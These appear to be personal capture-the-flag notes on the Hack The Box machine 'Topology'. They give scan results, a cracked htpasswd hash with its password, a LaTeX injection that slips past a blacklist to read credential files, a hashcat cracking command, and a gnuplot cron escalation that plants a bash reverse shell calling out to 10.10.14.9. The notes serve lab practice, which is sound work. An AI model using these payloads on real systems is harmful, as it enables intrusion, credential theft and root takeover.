# Topology

| Name      | IP           | Difficulty | OS    |
| ------ | ------------ | ---------- | ----- |
| topology | 10.10.11.217 | Easy       | Linux |

## NMAP

| HOST                        | PORT | PROTO | SERVICE      | VERSION                 |
| --------------------------- | ---- | ----- | ------------ | ----------------------- |
| 10.10.11.217 (topology.htb) | 22   | tcp   | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.7 |
| 10.10.11.217 (topology.htb) | 80   | tcp   | Apache httpd | 2.4.41                  |


## HEADERS

```
HTTP/1.1 200 OK
Date: Fri, 07 Jul 2023 23:58:29 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 17 Jan 2023 17:26:29 GMT
ETag: "1a6f-5f27900124a8b"
Accept-Ranges: bytes
Content-Length: 6767
Vary: Accept-Encoding
Content-Type: text/html
```

## DIRECTORIES


## USERS

- vdaisley $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0 (calculus20)

## NOTES

* Found: dev.topology.htb Status: 401 [Size: 463] (login)
* Found: stats.topology.htb Status: 200 [Size: 108] (fake stats page)
* latex.topology.htb
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection latex injection cheatsheet
* has blacklisted commands, that can be bypassed using `$` either side 
* `$\lstinputlisting{/var/www/dev/.htpasswd}$`
* `hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt` to crack htpasswd
* `pspy64` shows `gnuplot` running a wildcard `.plt` script in the `/opt/gnuplot` directory as root
* create a `.plt` script with the code `system "bash -c 'bash -i >& /dev/tcp/10.10.14.9/2222 0>&1'"` to execute a reverse shell
* copy it into `/opt/gnuplot` with a listener open
